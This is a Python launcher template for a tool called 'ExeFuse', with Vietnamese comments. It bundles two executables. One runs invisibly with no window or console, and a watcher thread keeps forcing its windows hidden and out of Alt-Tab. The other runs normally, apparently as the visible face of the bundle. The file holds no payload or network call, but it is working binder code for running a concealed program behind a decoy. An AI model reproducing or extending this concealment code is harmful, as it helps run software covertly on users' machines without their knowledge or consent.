# -*- coding: utf-8 -*-
"""
ExeFuse Launcher
================
File nay duoc ExeFuse SINH RA TU DONG luc build (tu launcher_template.py).

Nhiem vu:
  1. Chay app AN   : khong cua so (SW_HIDE + CREATE_NO_WINDOW),
                     kem watcher lien tuc ep an moi cua so no tao ra.
  2. Chay app HIEN : binh thuong (bo qua neu build o che do SOLO).
  3. Don dep       : khi app chinh dong -> kill tien trinh an (neu cau hinh).

Cac token %%...%% se duoc builder thay bang gia tri that truoc khi build.
"""

import atexit
import os
import subprocess
import sys
import threading
import time

IS_WINDOWS = (os.name == "nt")

# --- Cau hinh (duoc thay the luc build) ---
HIDDEN_NAME = "%%HIDDEN_NAME%%"
VISIBLE_NAME = "%%VISIBLE_NAME%%"  # rong = che do SOLO (chi chay app an)
KILL_HIDDEN_ON_VISIBLE_EXIT = %%KILL_HIDDEN%%
ENABLE_HIDE_WATCHER = %%HIDE_WATCH%%


def _resource_base():
    """Thu muc chua cac file nhung trong bundle (PyInstaller onefile)."""
    if getattr(sys, "frozen", False):
        return getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
    return os.path.dirname(os.path.abspath(__file__))


def _exe_path(name):
    return os.path.join(_resource_base(), name)


def _launch_cwd():
    """Thu muc lam viec cho 2 app = noi chua file launcher (than thien voi app)."""
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return _resource_base()


def _fatal(message):
    """Bao loi bang hop thoai (launcher khong co console)."""
    try:
        if IS_WINDOWS:
            import ctypes
            ctypes.windll.user32.MessageBoxW(None, message, "ExeFuse", 0x00000010)
        else:
            sys.stderr.write(message + "\n")
    except Exception:
        pass


def _launch_hidden(path):
    """Khoi dong app an: khong cua so, khong console."""
    kwargs = {"cwd": _launch_cwd()}
    if IS_WINDOWS:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0  # SW_HIDE
        kwargs.update({
            "startupinfo": si,
            "creationflags": subprocess.CREATE_NO_WINDOW,
            "stdin": subprocess.DEVNULL,
            "stdout": subprocess.DEVNULL,
            "stderr": subprocess.DEVNULL,
        })
    return subprocess.Popen([path], **kwargs)


def _launch_visible(path):
    """Khoi dong app hien giao dien: binh thuong."""
    return subprocess.Popen([path], cwd=_launch_cwd())


def _kill_tree(proc):
    """Kill tien trinh (ca cay con) - Windows dung taskkill /T /F."""
    if proc is None or proc.poll() is not None:
        return
    try:
        if IS_WINDOWS:
            subprocess.run(
                ["taskkill", "/PID", str(proc.pid), "/T", "/F"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
        else:
            proc.terminate()
    except Exception:
        pass


def _start_hide_watcher(proc):
    """Lien tuc an moi cua so cua tien trinh an (phong khi app tu mo lai cua so).

    Dung WinAPI EnumWindows de tim cua so theo PID, goi ShowWindow(SW_HIDE)
    va them WS_EX_TOOLWINDOW de cua so khong lo vao Alt-Tab.
    """
    if not IS_WINDOWS or not ENABLE_HIDE_WATCHER:
        return

    import ctypes
    from ctypes import wintypes

    user32 = ctypes.windll.user32
    SW_HIDE = 0
    GWL_EXSTYLE = -20
    WS_EX_TOOLWINDOW = 0x00000080
    ENUM_PROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)

    def windows_of_pid(target_pid):
        found = []

        def on_window(hwnd, _lparam):
            pid = wintypes.DWORD()
            user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value == target_pid:
                found.append(hwnd)
            return True

        user32.EnumWindows(ENUM_PROC(on_window), 0)
        return found

    def worker():
        while proc.poll() is None:
            try:
                for hwnd in windows_of_pid(proc.pid):
                    user32.ShowWindow(hwnd, SW_HIDE)
                    style = user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
                    user32.SetWindowLongW(hwnd, GWL_EXSTYLE, style | WS_EX_TOOLWINDOW)
            except Exception:
                pass
            time.sleep(0.4)

    threading.Thread(target=worker, daemon=True).start()


def main():
    # --- App an (bat buoc) ---
    hidden_path = _exe_path(HIDDEN_NAME)
    if not os.path.isfile(hidden_path):
        _fatal("ExeFuse: không tìm thấy tệp ẩn nhúng trong bundle:\n%s" % hidden_path)
        return 1

    try:
        hidden_proc = _launch_hidden(hidden_path)
    except Exception as exc:
        _fatal("ExeFuse: không khởi động được ứng dụng ẩn:\n%s" % exc)
        return 1

    _start_hide_watcher(hidden_proc)
    atexit.register(_kill_tree, hidden_proc)

    # --- Che do SOLO: khong co app hien, cho app an chay den khi tu ket thuc ---
    if not VISIBLE_NAME:
        hidden_proc.wait()
        return 0

    # --- App hien (neu co trong bundle) ---
    visible_path = _exe_path(VISIBLE_NAME)
    if not os.path.isfile(visible_path):
        _fatal("ExeFuse: không tìm thấy tệp hiển thị nhúng trong bundle:\n%s" % visible_path)
        return 1

    try:
        visible_proc = _launch_visible(visible_path)
    except Exception as exc:
        _fatal("ExeFuse: không khởi động được ứng dụng hiển thị:\n%s" % exc)
        _kill_tree(hidden_proc)
        return 1

    atexit.register(_kill_tree, visible_proc)

    if KILL_HIDDEN_ON_VISIBLE_EXIT:
        # App chinh dong -> ket thuc tien trinh an (tiet kiem tai nguyen)
        visible_proc.wait()
        time.sleep(0.3)
        _kill_tree(hidden_proc)
    else:
        # Cho ca 2 app ket thuc roi launcher moi thoat
        hidden_proc.wait()
        visible_proc.wait()

    return 0


if __name__ == "__main__":
    sys.exit(main())
